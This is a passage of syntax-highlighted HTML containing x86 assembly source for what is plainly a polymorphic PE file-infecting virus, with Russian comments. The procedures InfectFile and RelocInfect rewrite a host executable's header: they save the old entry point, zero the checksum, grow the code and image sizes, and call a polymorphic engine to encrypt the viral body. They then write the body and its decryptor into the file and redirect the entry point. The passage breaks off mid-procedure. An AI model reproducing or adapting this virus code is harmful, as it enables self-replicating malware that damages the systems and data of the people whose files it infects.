</span><span class="sc5">ww</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">irva</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; RVA нашей секции</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Old EntryPoint RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; + ImageBase = VA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">oldh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">58h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; CheckSum</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">6</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Наш размер. Пропатчим его</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fvlen</span><span class="sc0">           </span><span class="sc1">; на object align</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">fvlen</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">1Ch</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; +Code Size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">50h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; +Image Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mysze</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Virtual Size of our section</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">main</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">body</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Шифруемся</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">wsmm</span><span class="sc0">                </span><span class="sc1">; Polymorphic engine</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">xVic</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">CloseIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dclen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Размер расшифровщика</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecbody</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Смещение на зашифрованный код</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">cVir</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Пропатчим размер на object align</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">cVir</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">msize</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ecbody</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Пишимся</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">mpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">mysec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; секции</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">; На начало первой секции</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">body</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">dclen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Пишим расшифровщик</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Новый EiP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">peh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; PE заголовок</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CloseIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; Закрываем</span><span class="sc0">
</span><span class="sc5">nextone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RelocInfect</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Old EntryPoint RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; + ImageBase = VA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">oldh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">58h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; CheckSum</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">rsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Наш размер. Пропатчим его</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fvlen</span><span class="sc0">           </span><span class="sc1">; на object align</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">fvlen</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">1Ch</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; +Code Size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">50h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; +Image Size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Virtual Size of our section</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">main</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">body</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Шифруемся</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">wsmm</span><span class="sc0">                </span><span class="sc1">; Polymorphic engine</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">xVic</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">CloseIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dclen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Размер расшифровщика</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecbody</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Смещение на зашифрованный код</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">cVir</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Пропатчим размер на object align</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">cVir</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">rsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ecbody</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Пишимся</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">mpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">; На начало первой секции</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">body</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">dclen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
